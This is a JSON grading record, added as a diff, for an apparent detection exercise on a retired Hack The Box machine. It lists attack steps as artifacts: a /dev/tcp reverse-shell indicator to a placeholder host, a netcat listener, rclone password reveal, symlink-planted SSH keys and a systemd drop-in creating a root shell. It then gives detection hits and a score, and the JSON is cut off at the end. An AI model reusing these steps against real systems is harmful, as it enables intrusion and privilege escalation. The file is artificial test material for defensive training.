@@ -1,0 +1,1649 @@
+{
+  "mode": "defense",
+  "session": {
+    "uuid": "de00f0e1-0001-4000-8000-000000000001",
+    "started_at": "2026-07-07T19:00:00.000Z",
+    "ended_at": "2026-07-07T19:14:23.600Z",
+    "target_scope": "HTB :: Abducted",
+    "context_path": "host",
+    "shell": "bash",
+    "source": "local_pty",
+    "machine": {
+      "name": "Abducted",
+      "os": "Linux",
+      "difficulty": "Medium",
+      "retired": true
+    },
+    "target": {
+      "platform": "htb",
+      "kind": "box",
+      "name": "Abducted",
+      "slug": "abducted",
+      "os": "Linux",
+      "difficulty": {
+        "level": 3,
+        "label": "Medium"
+      },
+      "emblem": {
+        "avatar": "https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1f1a05f-5c5d-4cca-8103-cf875d8e5698-1780591497.png",
+        "hue": null
+      },
+      "url": "https://app.hackthebox.com/machines/abducted"
+    }
+  },
+  "incident": {
+    "artifacts": [
+      {
+        "id": "art:seq1",
+        "label": "nmap: nmap -p- --min-rate 10000 abducted.htb",
+        "phase": "reconnaissance",
+        "technique": "T1046",
+        "indicators": [
+          "--min-rate",
+          "abducted.htb",
+          "22/tcp",
+          "139/tcp",
+          "netbios-ssn",
+          "445/tcp"
+        ],
+        "entities": [
+          "abducted.htb"
+        ],
+        "weight": 1,
+        "depends_on": [],
+        "source_seq": 1
+      },
+      {
+        "id": "art:seq2",
+        "label": "nmap: nmap -p 22,139,445 -sCV abducted.htb",
+        "phase": "reconnaissance",
+        "technique": "T1046",
+        "indicators": [
+          "22,139,445",
+          "abducted.htb",
+          "22/tcp",
+          "OpenSSH",
+          "9.6p1",
+          "3ubuntu13.16"
+        ],
+        "entities": [
+          "abducted.htb"
+        ],
+        "weight": 1,
+        "depends_on": [
+          "art:seq1"
+        ],
+        "source_seq": 2
+      },
+      {
+        "id": "art:seq3",
+        "label": "nmblookup: nmblookup -A abducted.htb",
+        "phase": "reconnaissance",
+        "technique": "T1059",
+        "indicators": [
+          "nmblookup",
+          "abducted.htb",
+          "ABDUCTED",
+          "<00><03><20>",
+          "WORKGROUP",
+          "<00><1d><1e>"
+        ],
+        "entities": [
+          "abducted.htb"
+        ],
+        "weight": 1,
+        "depends_on": [
+          "art:seq2"
+        ],
+        "source_seq": 3
+      },
+      {
+        "id": "art:seq4",
+        "label": "smbclient: smbclient -L //abducted.htb/ -N",
+        "phase": "reconnaissance",
+        "technique": "T1059",
+        "indicators": [
+          "smbclient",
+          "//abducted.htb/",
+          "HP-Reception",
+          "Printer",
+          "projects",
+          "transfer"
+        ],
+        "entities": [
+          "abducted.htb"
+        ],
+        "weight": 1,
+        "depends_on": [
+          "art:seq3"
+        ],
+        "source_seq": 4
+      },
+      {
+        "id": "art:seq5",
+        "label": "rpcclient: rpcclient -N abducted.htb -U \"\" -c enumdomusers",
+        "phase": "reconnaissance",
+        "technique": "T1059",
+        "indicators": [
+          "rpcclient",
+          "abducted.htb",
+          "enumdomusers",
+          "user:[scott]",
+          "rid:[0x3e8]",
+          "session"
+        ],
+        "entities": [
+          "abducted.htb",
+          "scott"
+        ],
+        "weight": 1,
+        "depends_on": [
+          "art:seq4"
+        ],
+        "source_seq": 5
+      },
+      {
+        "id": "art:seq6",
+        "label": "rpcclient: rpcclient -N abducted.htb -U \"\" -c netshareenuma",
+        "phase": "reconnaissance",
+        "technique": "T1059",
+        "indicators": [
+          "rpcclient",
+          "abducted.htb",
+          "netshareenumall",
+          "HP-Reception",
+          "C:\\var\\spool\\samba",
+          "projects"
+        ],
+        "entities": [
+          "abducted.htb"
+        ],
+        "weight": 1,
+        "depends_on": [
+          "art:seq5"
+        ],
+        "source_seq": 6
+      },
+      {
+        "id": "art:seq7",
+        "label": "echo (CVE-2026-4480)",
+        "phase": "execution",
+        "technique": "T1059",
+        "indicators": [
+          "/dev/tcp/x.x.x.x/443",
+          "payload",
+          "written",
+          "command",
+          "forwards",
+          "description",
+          "CVE-2026-4480"
+        ],
+        "entities": [],
+        "weight": 6,
+        "depends_on": [
+          "art:seq6"
+        ],
+        "source_seq": 7
+      },
+      {
+        "id": "art:seq8",
+        "label": "nc: nc -lnvp 443",
+        "phase": "execution",
+        "technique": "T1059",
+        "indicators": [
+          "listening"
+        ],
+        "entities": [],
+        "weight": 4,
+        "depends_on": [
+          "art:seq7"
+        ],
+        "source_seq": 8
+      },
+      {
+        "id": "art:seq9",
+        "label": "smbclient: smbclient //abducted.htb/HP-Reception -N -c 'pri",
+        "phase": "reconnaissance",
+        "technique": "T1059",
+        "indicators": [
+          "smbclient",
+          "//abducted.htb/HP-Reception",
+          "putting",
+          "description",
+          "command",
+          "nobody@abducted:/var/spool/samba$"
+        ],
+        "entities": [
+          "abducted.htb"
+        ],
+        "weight": 1,
+        "depends_on": [
+          "art:seq8"
+        ],
+        "source_seq": 9
+      },
+      {
+        "id": "art:seq10",
+        "label": "script: script /dev/null -c bash",
+        "phase": "reconnaissance",
+        "technique": "T1059",
+        "indicators": [
+          "/dev/null",
+          "nobody@abducted:/var/spool/samba$",
+          "upgraded"
+        ],
+        "entities": [],
+        "weight": 1,
+        "depends_on": [
+          "art:seq9"
+        ],
+        "source_seq": 10
+      },
+      {
+        "id": "art:seq12",
+        "label": "id: id",
+        "phase": "privilege-escalation",
+        "technique": "T1033",
+        "indicators": [
+          "uid=65534",
+          "gid=65534",
+          "nogroup",
+          "groups=65534"
+        ],
+        "entities": [],
+        "weight": 5,
+        "depends_on": [
+          "art:seq10"
+        ],
+        "source_seq": 12
+      },
+      {
+        "id": "art:seq13",
+        "label": "cat: cat /etc/passwd | grep 'sh$'",
+        "phase": "privilege-escalation",
+        "technique": "T1083",
+        "indicators": [
+          "/etc/passwd",
+          "root:x:0:0:root:/root:/bin/bash",
+          "scott:x:1000:1001:Scott",
+          "Mercer:/home/scott:/bin/bash",
+          "marcus:x:1001:1002:Marcus",
+          "Vale:/home/marcus:/bin/bash"
+        ],
+        "entities": [],
+        "weight": 5,
+        "depends_on": [
+          "art:seq12"
+        ],
+        "source_seq": 13
+      },
+      {
+        "id": "art:seq14",
+        "label": "ls: ls /opt/offsite-backup",
+        "phase": "privilege-escalation",
+        "technique": "T1083",
+        "indicators": [
+          "/opt/offsite-backup",
+          "rclone.conf",
+          "sync.sh"
+        ],
+        "entities": [],
+        "weight": 5,
+        "depends_on": [
+          "art:seq13"
+        ],
+        "source_seq": 14
+      },
+      {
+        "id": "art:seq15",
+        "label": "cat: cat /opt/offsite-backup/rclone.conf",
+        "phase": "privilege-escalation",
+        "technique": "T1083",
+        "indicators": [
+          "/opt/offsite-backup/rclone.conf",
+          "[offsite]",
+          "backup.hartley-group.internal",
+          "svc-backup",
+          "[redacted]",
+          "rclone-obscured",
+          "rclone.conf"
+        ],
+        "entities": [
+          "hartley-group.internal"
+        ],
+        "weight": 5,
+        "depends_on": [
+          "art:seq14"
+        ],
+        "source_seq": 15
+      },
+      {
+        "id": "art:seq16",
+        "label": "rclone: rclone reveal [redacted]",
+        "phase": "reconnaissance",
+        "technique": "T1059",
+        "indicators": [
+          "[redacted]",
+          "plaintext",
+          "offsite-backup",
+          "password"
+        ],
+        "entities": [],
+        "weight": 1,
+        "depends_on": [
+          "art:seq15"
+        ],
+        "source_seq": 16
+      },
+      {
+        "id": "art:seq17",
+        "label": "su: su - scott",
+        "phase": "reconnaissance",
+        "technique": "T1059",
+        "indicators": [
+          "Password:",
+          "[redacted]",
+          "scott@abducted:~$",
+          "offsite-backup",
+          "password",
+          "account"
+        ],
+        "entities": [],
+        "weight": 1,
+        "depends_on": [
+          "art:seq16"
+        ],
+        "source_seq": 17
+      },
+      {
+        "id": "art:seq18",
+        "label": "cat: cat user.txt",
+        "phase": "privilege-escalation",
+        "technique": "T1083",
+        "indicators": [
+          "user.txt",
+          "[redacted-flag]"
+        ],
+        "entities": [],
+        "weight": 5,
+        "depends_on": [
+          "art:seq17"
+        ],
+        "source_seq": 18
+      },
+      {
+        "id": "art:seq19",
+        "label": "cat: cat /etc/samba/shares.conf",
+        "phase": "privilege-escalation",
+        "technique": "T1083",
+        "indicators": [
+          "/etc/samba/shares.conf",
+          "[transfer]",
+          "insecure",
+          "shares.conf"
+        ],
+        "entities": [],
+        "weight": 5,
+        "depends_on": [
+          "art:seq18"
+        ],
+        "source_seq": 19
+      },
+      {
+        "id": "art:seq20",
+        "label": "ln: ln -s /home/marcus /srv/transfer/marcus-link",
+        "phase": "reconnaissance",
+        "technique": "T1059",
+        "indicators": [
+          "/home/marcus",
+          "/srv/transfer/marcus-link",
+          "symlink",
+          "created",
+          "user=marcus",
+          "resolve"
+        ],
+        "entities": [],
+        "weight": 1,
+        "depends_on": [
+          "art:seq19"
+        ],
+        "source_seq": 20
+      },
+      {
+        "id": "art:seq21",
+        "label": "smbclient: smbclient //abducted.htb/transfer -U scott%[reda",
+        "phase": "reconnaissance",
+        "technique": "T1059",
+        "indicators": [
+          "smbclient",
+          "//abducted.htb/transfer",
+          "scott%[redacted]",
+          "marcus-link/.ssh",
+          "id_ed25519.pub",
+          "marcus-link/.ssh/authorized_keys"
+        ],
+        "entities": [
+          "abducted.htb"
+        ],
+        "weight": 1,
+        "depends_on": [
+          "art:seq20"
+        ],
+        "source_seq": 21
+      },
+      {
+        "id": "art:seq22",
+        "label": "ssh: ssh -o IdentityFile=./id_ed25519 marcus@abducted",
+        "phase": "reconnaissance",
+        "technique": "T1059",
+        "indicators": [
+          "IdentityFile=./id_ed25519",
+          "marcus@abducted.htb",
+          "marcus@abducted:~$",
+          "key-based",
+          "password"
+        ],
+        "entities": [
+          "abducted.htb"
+        ],
+        "weight": 1,
+        "depends_on": [
+          "art:seq21"
+        ],
+        "source_seq": 22
+      },
+      {
+        "id": "art:seq23",
+        "label": "id: id",
+        "phase": "privilege-escalation",
+        "technique": "T1033",
+        "indicators": [
+          "uid=1001",
+          "gid=1002",
+          "groups=1002",
+          "operators"
+        ],
+        "entities": [],
+        "weight": 5,
+        "depends_on": [
+          "art:seq22"
+        ],
+        "source_seq": 23
+      },
+      {
+        "id": "art:seq24",
+        "label": "ls: ls -ld /etc/systemd/system/smbd.service.d/",
+        "phase": "privilege-escalation",
+        "technique": "T1083",
+        "indicators": [
+          "/etc/systemd/system/smbd.service.d/",
+          "drwxrwxr-x",
+          "operators",
+          "group-writable",
+          "smbd.service"
+        ],
+        "entities": [],
+        "weight": 5,
+        "depends_on": [
+          "art:seq23"
+        ],
+        "source_seq": 24
+      },
+      {
+        "id": "art:seq25",
+        "label": "echo: echo -e '[Service]\\nExecStartPre=-/bin/bash -c \"",
+        "phase": "reconnaissance",
+        "technique": "T1059",
+        "indicators": [
+          "[Service]\\nExecStartPre=-/bin/bash",
+          "/bin/bash",
+          "/tmp/.rootbash",
+          "/etc/systemd/system/smbd.service.d/override.conf",
+          "drop-in",
+          "written",
+          "smbd.service",
+          "override.conf"
+        ],
+        "entities": [],
+        "weight": 1,
+        "depends_on": [
+          "art:seq24"
+        ],
+        "source_seq": 25
+      },
+      {
+        "id": "art:seq26",
+        "label": "systemctl: systemctl daemon-reload",
+        "phase": "reconnaissance",
+        "technique": "T1059",
+        "indicators": [
+          "systemctl",
+          "daemon-reload",
+          "reloaded"
+        ],
+        "entities": [],
+        "weight": 1,
+        "depends_on": [
+          "art:seq25"
+        ],
+        "source_seq": 26
+      },
+      {
+        "id": "art:seq27",
+        "label": "systemctl: systemctl restart smbd",
+        "phase": "reconnaissance",
+        "technique": "T1059",
+        "indicators": [
+          "systemctl",
+          "restart",
+          "restarted",
+          "ExecStartPre",
+          "/tmp/.rootbash"
+        ],
+        "entities": [],
+        "weight": 1,
+        "depends_on": [
+          "art:seq26"
+        ],
+        "source_seq": 27
+      },
+      {
+        "id": "art:seq28",
+        "label": ".rootbash: /tmp/.rootbash -p",
+        "phase": "reconnaissance",
+        "technique": "T1059",
+        "indicators": [
+          "/tmp/.rootbash",
+          "bash-5.2#",
+          "spawned"
+        ],
+        "entities": [],
+        "weight": 1,
+        "depends_on": [
+          "art:seq27"
+        ],
+        "source_seq": 28
+      },
+      {
+        "id": "art:seq30",
+        "label": "cat: cat root.txt",
+        "phase": "privilege-escalation",
+        "technique": "T1083",
+        "indicators": [
+          "root.txt",
+          "[redacted-flag]"
+        ],
+        "entities": [],
+        "weight": 5,
+        "depends_on": [
+          "art:seq28"
+        ],
+        "source_seq": 30
+      }
+    ],
+    "entities": [
+      "abducted.htb",
+      "scott",
+      "hartley-group.internal"
+    ],
+    "target_scope": "Abducted"
+  },
+  "result": {
+    "incident": {
+      "artifacts": [
+        {
+          "id": "art:seq1",
+          "label": "nmap: nmap -p- --min-rate 10000 abducted.htb",
+          "phase": "reconnaissance",
+          "technique": "T1046",
+          "indicators": [
+            "--min-rate",
+            "abducted.htb",
+            "22/tcp",
+            "139/tcp",
+            "netbios-ssn",
+            "445/tcp"
+          ],
+          "entities": [
+            "abducted.htb"
+          ],
+          "weight": 1,
+          "depends_on": [],
+          "source_seq": 1
+        },
+        {
+          "id": "art:seq2",
+          "label": "nmap: nmap -p 22,139,445 -sCV abducted.htb",
+          "phase": "reconnaissance",
+          "technique": "T1046",
+          "indicators": [
+            "22,139,445",
+            "abducted.htb",
+            "22/tcp",
+            "OpenSSH",
+            "9.6p1",
+            "3ubuntu13.16"
+          ],
+          "entities": [
+            "abducted.htb"
+          ],
+          "weight": 1,
+          "depends_on": [
+            "art:seq1"
+          ],
+          "source_seq": 2
+        },
+        {
+          "id": "art:seq3",
+          "label": "nmblookup: nmblookup -A abducted.htb",
+          "phase": "reconnaissance",
+          "technique": "T1059",
+          "indicators": [
+            "nmblookup",
+            "abducted.htb",
+            "ABDUCTED",
+            "<00><03><20>",
+            "WORKGROUP",
+            "<00><1d><1e>"
+          ],
+          "entities": [
+            "abducted.htb"
+          ],
+          "weight": 1,
+          "depends_on": [
+            "art:seq2"
+          ],
+          "source_seq": 3
+        },
+        {
+          "id": "art:seq4",
+          "label": "smbclient: smbclient -L //abducted.htb/ -N",
+          "phase": "reconnaissance",
+          "technique": "T1059",
+          "indicators": [
+            "smbclient",
+            "//abducted.htb/",
+            "HP-Reception",
+            "Printer",
+            "projects",
+            "transfer"
+          ],
+          "entities": [
+            "abducted.htb"
+          ],
+          "weight": 1,
+          "depends_on": [
+            "art:seq3"
+          ],
+          "source_seq": 4
+        },
+        {
+          "id": "art:seq5",
+          "label": "rpcclient: rpcclient -N abducted.htb -U \"\" -c enumdomusers",
+          "phase": "reconnaissance",
+          "technique": "T1059",
+          "indicators": [
+            "rpcclient",
+            "abducted.htb",
+            "enumdomusers",
+            "user:[scott]",
+            "rid:[0x3e8]",
+            "session"
+          ],
+          "entities": [
+            "abducted.htb",
+            "scott"
+          ],
+          "weight": 1,
+          "depends_on": [
+            "art:seq4"
+          ],
+          "source_seq": 5
+        },
+        {
+          "id": "art:seq6",
+          "label": "rpcclient: rpcclient -N abducted.htb -U \"\" -c netshareenuma",
+          "phase": "reconnaissance",
+          "technique": "T1059",
+          "indicators": [
+            "rpcclient",
+            "abducted.htb",
+            "netshareenumall",
+            "HP-Reception",
+            "C:\\var\\spool\\samba",
+            "projects"
+          ],
+          "entities": [
+            "abducted.htb"
+          ],
+          "weight": 1,
+          "depends_on": [
+            "art:seq5"
+          ],
+          "source_seq": 6
+        },
+        {
+          "id": "art:seq7",
+          "label": "echo (CVE-2026-4480)",
+          "phase": "execution",
+          "technique": "T1059",
+          "indicators": [
+            "/dev/tcp/x.x.x.x/443",
+            "payload",
+            "written",
+            "command",
+            "forwards",
+            "description",
+            "CVE-2026-4480"
+          ],
+          "entities": [],
+          "weight": 6,
+          "depends_on": [
+            "art:seq6"
+          ],
+          "source_seq": 7
+        },
+        {
+          "id": "art:seq8",
+          "label": "nc: nc -lnvp 443",
+          "phase": "execution",
+          "technique": "T1059",
+          "indicators": [
+            "listening"
+          ],
+          "entities": [],
+          "weight": 4,
+          "depends_on": [
+            "art:seq7"
+          ],
+          "source_seq": 8
+        },
+        {
+          "id": "art:seq9",
+          "label": "smbclient: smbclient //abducted.htb/HP-Reception -N -c 'pri",
+          "phase": "reconnaissance",
+          "technique": "T1059",
+          "indicators": [
+            "smbclient",
+            "//abducted.htb/HP-Reception",
+            "putting",
+            "description",
+            "command",
+            "nobody@abducted:/var/spool/samba$"
+          ],
+          "entities": [
+            "abducted.htb"
+          ],
+          "weight": 1,
+          "depends_on": [
+            "art:seq8"
+          ],
+          "source_seq": 9
+        },
+        {
+          "id": "art:seq10",
+          "label": "script: script /dev/null -c bash",
+          "phase": "reconnaissance",
+          "technique": "T1059",
+          "indicators": [
+            "/dev/null",
+            "nobody@abducted:/var/spool/samba$",
+            "upgraded"
+          ],
+          "entities": [],
+          "weight": 1,
+          "depends_on": [
+            "art:seq9"
+          ],
+          "source_seq": 10
+        },
+        {
+          "id": "art:seq12",
+          "label": "id: id",
+          "phase": "privilege-escalation",
+          "technique": "T1033",
+          "indicators": [
+            "uid=65534",
+            "gid=65534",
+            "nogroup",
+            "groups=65534"
+          ],
+          "entities": [],
+          "weight": 5,
+          "depends_on": [
+            "art:seq10"
+          ],
+          "source_seq": 12
+        },
+        {
+          "id": "art:seq13",
+          "label": "cat: cat /etc/passwd | grep 'sh$'",
+          "phase": "privilege-escalation",
+          "technique": "T1083",
+          "indicators": [
+            "/etc/passwd",
+            "root:x:0:0:root:/root:/bin/bash",
+            "scott:x:1000:1001:Scott",
+            "Mercer:/home/scott:/bin/bash",
+            "marcus:x:1001:1002:Marcus",
+            "Vale:/home/marcus:/bin/bash"
+          ],
+          "entities": [],
+          "weight": 5,
+          "depends_on": [
+            "art:seq12"
+          ],
+          "source_seq": 13
+        },
+        {
+          "id": "art:seq14",
+          "label": "ls: ls /opt/offsite-backup",
+          "phase": "privilege-escalation",
+          "technique": "T1083",
+          "indicators": [
+            "/opt/offsite-backup",
+            "rclone.conf",
+            "sync.sh"
+          ],
+          "entities": [],
+          "weight": 5,
+          "depends_on": [
+            "art:seq13"
+          ],
+          "source_seq": 14
+        },
+        {
+          "id": "art:seq15",
+          "label": "cat: cat /opt/offsite-backup/rclone.conf",
+          "phase": "privilege-escalation",
+          "technique": "T1083",
+          "indicators": [
+            "/opt/offsite-backup/rclone.conf",
+            "[offsite]",
+            "backup.hartley-group.internal",
+            "svc-backup",
+            "[redacted]",
+            "rclone-obscured",
+            "rclone.conf"
+          ],
+          "entities": [
+            "hartley-group.internal"
+          ],
+          "weight": 5,
+          "depends_on": [
+            "art:seq14"
+          ],
+          "source_seq": 15
+        },
+        {
+          "id": "art:seq16",
+          "label": "rclone: rclone reveal [redacted]",
+          "phase": "reconnaissance",
+          "technique": "T1059",
+          "indicators": [
+            "[redacted]",
+            "plaintext",
+            "offsite-backup",
+            "password"
+          ],
+          "entities": [],
+          "weight": 1,
+          "depends_on": [
+            "art:seq15"
+          ],
+          "source_seq": 16
+        },
+        {
+          "id": "art:seq17",
+          "label": "su: su - scott",
+          "phase": "reconnaissance",
+          "technique": "T1059",
+          "indicators": [
+            "Password:",
+            "[redacted]",
+            "scott@abducted:~$",
+            "offsite-backup",
+            "password",
+            "account"
+          ],
+          "entities": [],
+          "weight": 1,
+          "depends_on": [
+            "art:seq16"
+          ],
+          "source_seq": 17
+        },
+        {
+          "id": "art:seq18",
+          "label": "cat: cat user.txt",
+          "phase": "privilege-escalation",
+          "technique": "T1083",
+          "indicators": [
+            "user.txt",
+            "[redacted-flag]"
+          ],
+          "entities": [],
+          "weight": 5,
+          "depends_on": [
+            "art:seq17"
+          ],
+          "source_seq": 18
+        },
+        {
+          "id": "art:seq19",
+          "label": "cat: cat /etc/samba/shares.conf",
+          "phase": "privilege-escalation",
+          "technique": "T1083",
+          "indicators": [
+            "/etc/samba/shares.conf",
+            "[transfer]",
+            "insecure",
+            "shares.conf"
+          ],
+          "entities": [],
+          "weight": 5,
+          "depends_on": [
+            "art:seq18"
+          ],
+          "source_seq": 19
+        },
+        {
+          "id": "art:seq20",
+          "label": "ln: ln -s /home/marcus /srv/transfer/marcus-link",
+          "phase": "reconnaissance",
+          "technique": "T1059",
+          "indicators": [
+            "/home/marcus",
+            "/srv/transfer/marcus-link",
+            "symlink",
+            "created",
+            "user=marcus",
+            "resolve"
+          ],
+          "entities": [],
+          "weight": 1,
+          "depends_on": [
+            "art:seq19"
+          ],
+          "source_seq": 20
+        },
+        {
+          "id": "art:seq21",
+          "label": "smbclient: smbclient //abducted.htb/transfer -U scott%[reda",
+          "phase": "reconnaissance",
+          "technique": "T1059",
+          "indicators": [
+            "smbclient",
+            "//abducted.htb/transfer",
+            "scott%[redacted]",
+            "marcus-link/.ssh",
+            "id_ed25519.pub",
+            "marcus-link/.ssh/authorized_keys"
+          ],
+          "entities": [
+            "abducted.htb"
+          ],
+          "weight": 1,
+          "depends_on": [
+            "art:seq20"
+          ],
+          "source_seq": 21
+        },
+        {
+          "id": "art:seq22",
+          "label": "ssh: ssh -o IdentityFile=./id_ed25519 marcus@abducted",
+          "phase": "reconnaissance",
+          "technique": "T1059",
+          "indicators": [
+            "IdentityFile=./id_ed25519",
+            "marcus@abducted.htb",
+            "marcus@abducted:~$",
+            "key-based",
+            "password"
+          ],
+          "entities": [
+            "abducted.htb"
+          ],
+          "weight": 1,
+          "depends_on": [
+            "art:seq21"
+          ],
+          "source_seq": 22
+        },
+        {
+          "id": "art:seq23",
+          "label": "id: id",
+          "phase": "privilege-escalation",
+          "technique": "T1033",
+          "indicators": [
+            "uid=1001",
+            "gid=1002",
+            "groups=1002",
+            "operators"
+          ],
+          "entities": [],
+          "weight": 5,
+          "depends_on": [
+            "art:seq22"
+          ],
+          "source_seq": 23
+        },
+        {
+          "id": "art:seq24",
+          "label": "ls: ls -ld /etc/systemd/system/smbd.service.d/",
+          "phase": "privilege-escalation",
+          "technique": "T1083",
+          "indicators": [
+            "/etc/systemd/system/smbd.service.d/",
+            "drwxrwxr-x",
+            "operators",
+            "group-writable",
+            "smbd.service"
+          ],
+          "entities": [],
+          "weight": 5,
+          "depends_on": [
+            "art:seq23"
+          ],
+          "source_seq": 24
+        },
+        {
+          "id": "art:seq25",
+          "label": "echo: echo -e '[Service]\\nExecStartPre=-/bin/bash -c \"",
+          "phase": "reconnaissance",
+          "technique": "T1059",
+          "indicators": [
+            "[Service]\\nExecStartPre=-/bin/bash",
+            "/bin/bash",
+            "/tmp/.rootbash",
+            "/etc/systemd/system/smbd.service.d/override.conf",
+            "drop-in",
+            "written",
+            "smbd.service",
+            "override.conf"
+          ],
+          "entities": [],
+          "weight": 1,
+          "depends_on": [
+            "art:seq24"
+          ],
+          "source_seq": 25
+        },
+        {
+          "id": "art:seq26",
+          "label": "systemctl: systemctl daemon-reload",
+          "phase": "reconnaissance",
+          "technique": "T1059",
+          "indicators": [
+            "systemctl",
+            "daemon-reload",
+            "reloaded"
+          ],
+          "entities": [],
+          "weight": 1,
+          "depends_on": [
+            "art:seq25"
+          ],
+          "source_seq": 26
+        },
+        {
+          "id": "art:seq27",
+          "label": "systemctl: systemctl restart smbd",
+          "phase": "reconnaissance",
+          "technique": "T1059",
+          "indicators": [
+            "systemctl",
+            "restart",
+            "restarted",
+            "ExecStartPre",
+            "/tmp/.rootbash"
+          ],
+          "entities": [],
+          "weight": 1,
+          "depends_on": [
+            "art:seq26"
+          ],
+          "source_seq": 27
+        },
+        {
+          "id": "art:seq28",
+          "label": ".rootbash: /tmp/.rootbash -p",
+          "phase": "reconnaissance",
+          "technique": "T1059",
+          "indicators": [
+            "/tmp/.rootbash",
+            "bash-5.2#",
+            "spawned"
+          ],
+          "entities": [],
+          "weight": 1,
+          "depends_on": [
+            "art:seq27"
+          ],
+          "source_seq": 28
+        },
+        {
+          "id": "art:seq30",
+          "label": "cat: cat root.txt",
+          "phase": "privilege-escalation",
+          "technique": "T1083",
+          "indicators": [
+            "root.txt",
+            "[redacted-flag]"
+          ],
+          "entities": [],
+          "weight": 5,
+          "depends_on": [
+            "art:seq28"
+          ],
+          "source_seq": 30
+        }
+      ],
+      "entities": [
+        "abducted.htb",
+        "scott",
+        "hartley-group.internal"
+      ],
+      "target_scope": "Abducted"
+    },
+    "hits": [
+      {
+        "artifact_id": "art:seq1",
+        "found": true,
+        "found_by_seq": 1,
+        "found_at_ms": 0,
+        "matched_indicator": "--min-rate"
+      },
+      {
+        "artifact_id": "art:seq2",
+        "found": true,
+        "found_by_seq": 1,
+        "found_at_ms": 0,
+        "matched_indicator": "abducted.htb"
+      },
+      {
+        "artifact_id": "art:seq3",
+        "found": true,
+        "found_by_seq": 1,
+        "found_at_ms": 0,
+        "matched_indicator": "abducted.htb"
+      },
+      {
+        "artifact_id": "art:seq4",
+        "found": true,
+        "found_by_seq": 4,
+        "found_at_ms": 120000,
+        "matched_indicator": "smbclient"
+      },
+      {
+        "artifact_id": "art:seq5",
+        "found": true,
+        "found_by_seq": 1,
+        "found_at_ms": 0,
+        "matched_indicator": "abducted.htb"
+      },
+      {
+        "artifact_id": "art:seq6",
+        "found": true,
+        "found_by_seq": 1,
+        "found_at_ms": 0,
+        "matched_indicator": "abducted.htb"
+      },
+      {
+        "artifact_id": "art:seq7",
+        "found": true,
+        "found_by_seq": 7,
+        "found_at_ms": 384300,
+        "matched_indicator": "/dev/tcp/x.x.x.x/443"
+      },
+      {
+        "artifact_id": "art:seq8",
+        "found": true,
+        "found_by_seq": 8,
+        "found_at_ms": 392700,
+        "matched_indicator": "listening"
+      },
+      {
+        "artifact_id": "art:seq9",
+        "found": true,
+        "found_by_seq": 4,
+        "found_at_ms": 120000,
+        "matched_indicator": "smbclient"
+      },
+      {
+        "artifact_id": "art:seq10",
+        "found": true,
+        "found_by_seq": 9,
+        "found_at_ms": 398300,
+        "matched_indicator": "nobody@abducted:/var/spool/samba$"
+      },
+      {
+        "artifact_id": "art:seq12",
+        "found": true,
+        "found_by_seq": 12,
+        "found_at_ms": 415700,
+        "matched_indicator": "uid=65534"
+      },
+      {
+        "artifact_id": "art:seq13",
+        "found": true,
+        "found_by_seq": 13,
+        "found_at_ms": 441000,
+        "matched_indicator": "/etc/passwd"
+      },
+      {
+        "artifact_id": "art:seq14",
+        "found": true,
+        "found_by_seq": 14,
+        "found_at_ms": 476700,
+        "matched_indicator": "/opt/offsite-backup"
+      },
+      {
+        "artifact_id": "art:seq15",
+        "found": true,
+        "found_by_seq": 14,
+        "found_at_ms": 476700,
+        "matched_indicator": "rclone.conf"
+      },
+      {
+        "artifact_id": "art:seq16",
+        "found": true,
+        "found_by_seq": 14,
+        "found_at_ms": 476700,
+        "matched_indicator": "offsite-backup"
+      },
+      {
+        "artifact_id": "art:seq17",
+        "found": true,
+        "found_by_seq": 14,
+        "found_at_ms": 476700,
+        "matched_indicator": "offsite-backup"
+      },
+      {
+        "artifact_id": "art:seq18",
+        "found": true,
+        "found_by_seq": 18,
+        "found_at_ms": 599300,
+        "matched_indicator": "user.txt"
+      },
+      {
+        "artifact_id": "art:seq19",
+        "found": true,
+        "found_by_seq": 19,
+        "found_at_ms": 659700,
+        "matched_indicator": "/etc/samba/shares.conf"
+      },
+      {
+        "artifact_id": "art:seq20",
+        "found": true,
+        "found_by_seq": 13,
+        "found_at_ms": 441000,
+        "matched_indicator": "/home/marcus"
+      },
+      {
+        "artifact_id": "art:seq21",
+        "found": true,
+        "found_by_seq": 4,
+        "found_at_ms": 120000,
+        "matched_indicator": "smbclient"
+      },
+      {
+        "artifact_id": "art:seq22",
+        "found": true,
+        "found_by_seq": 16,
+        "found_at_ms": 496600,
+        "matched_indicator": "password"
+      },
+      {
+        "artifact_id": "art:seq23",
+        "found": true,
+        "found_by_seq": 23,
+        "found_at_ms": 744700,
+        "matched_indicator": "uid=1001"
+      },
+      {
+        "artifact_id": "art:seq24",
+        "found": true,
+        "found_by_seq": 23,
+        "found_at_ms": 744700,
+        "matched_indicator": "operators"
+      },
+      {
+        "artifact_id": "art:seq25",
+        "found": true,
+        "found_by_seq": 7,
+        "found_at_ms": 384300,
+        "matched_indicator": "written"
+      },
+      {
+        "artifact_id": "art:seq26",
+        "found": true,
+        "found_by_seq": 26,
+        "found_at_ms": 837100,
+        "matched_indicator": "systemctl"
+      },
+      {
+        "artifact_id": "art:seq27",
+        "found": true,
+        "found_by_seq": 25,
+        "found_at_ms": 830500,
+        "matched_indicator": "/tmp/.rootbash"
+      },
+      {
+        "artifact_id": "art:seq28",
+        "found": true,
+        "found_by_seq": 25,
+        "found_at_ms": 830500,
+        "matched_indicator": "/tmp/.rootbash"
+      },
+      {
+        "artifact_id": "art:seq30",
+        "found": true,
+        "found_by_seq": 18,
+        "found_at_ms": 599300,
+        "matched_indicator": "[redacted-flag]"
+      }
+    ],
+    "advancing_seqs": [
+      1,
+      4,
+      7,
+      8,
+      9,
+      12,
+      13,
+      14,
+      16,
+      18,
+      19,
+      23,
+      25,
+      26
+    ],
+    "noise_seqs": [
+      2,
+      3,
+      5,
+      6,
+      10,
+      11,
+      15,
+      17,
+      20,
+      21,
+      22,
+      24,
+      27,
+      28,
+      29,
+      30
+    ]
+  },
+  "grade": {
+    "score": 80.9,
+    "letter": "B",
+    "metrics": [
+      {
+        "name": "Coverage",
+        "score": 100,
+        "weight": 0.34,
+        "points": 34
+      },
+      {
+        "name": "Reconstruction",
+        "score": 74.1,
+        "weight": 0.2,
+        "points": 14.8
+      },
+      {
+        "name": "Time-to-detect",
+        "score": 60.1,
+        "weight": 0.16,
+        "points": 9.6
+      },
+      {
+        "name": "Scoping",
+        "score": 100,
+        "weight": 0.16,
+        "points": 16
+      },
+      {
+        "name": "Discipline",
+        "score": 46.7,
+        "weight": 0.14,
+        "points": 6.5
+      }
+    ]
+  },
+  "ghost": {
+    "time_lost_ms": 0,
+    "human_wins": 21,
+    "items": [
+      {
